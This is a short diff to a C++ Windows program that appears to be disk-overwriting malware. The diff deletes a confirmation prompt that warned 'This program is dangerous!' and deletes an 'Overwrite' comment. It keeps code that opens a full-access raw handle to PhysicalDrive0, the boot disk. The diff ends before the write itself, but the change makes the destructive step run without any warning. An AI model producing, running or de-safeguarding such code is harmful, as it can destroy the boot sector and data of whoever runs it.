@@ -6,14 +6,7 @@
 
 int main() 
 {
-    // Confirmation
-    std::string confirmation = "no";
-    std::cout << "This program is dangerous! Are you sure that you want to run this?\n";
-    std::cout << "Please type 'yes' or type 'no'\n>";
-    std::cin >> confirmation;
-    if (confirmation != "yes") { printf("Exiting program..."); return -1; }
 
-    // Overwrite
     HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive == INVALID_HANDLE_VALUE) { printf("Error opening a handle to the drive."); return -1; }
 
